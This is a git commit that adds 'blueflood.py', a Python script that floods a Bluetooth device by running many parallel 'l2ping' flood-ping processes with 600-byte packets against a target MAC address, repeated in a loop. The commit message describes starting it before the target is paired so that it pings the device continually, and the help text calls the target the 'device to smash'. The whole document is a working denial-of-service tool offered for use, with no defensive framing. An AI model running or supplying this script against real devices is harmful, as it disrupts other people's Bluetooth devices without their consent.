504feafabf98d40c53d3274b82ca342876e52574
3nc0d3d <3nc0d3d@gmail.com>
2021-09-20 17:35:28 +0000

    Create blueflood.py
    execute l2ping command with  size set at 600 bytes. The command is executed using more threads. The script have to start before that the bluetooth device target was paired, so when starts try to ping the device forever

---
+++ blueflood.py
@@ -0,0 +1,31 @@
+import subprocess
+import threading
+import sys
+import argparse
+
+def l2ping_flood(mac):
+    p = subprocess.Popen(["l2ping", "-s", "600", "-f", mac])
+    p.communicate()
+    return p.returncode
+
+def flood():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('mac', help='MAC address of device to smash')
+    parser.add_argument('-p', '--processes', help='Number of process to run l2ping on. Default is 100', default=100, type=int)
+    args = parser.parse_args()
+    threads = []
+    for i in range(args.processes):
+        t = threading.Thread(target=l2ping_flood, args=(args.mac,))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+        
+def main():
+    for i in range(10):
+        print(i)    
+        flood()
+
+if __name__ == "__main__":
+    main()
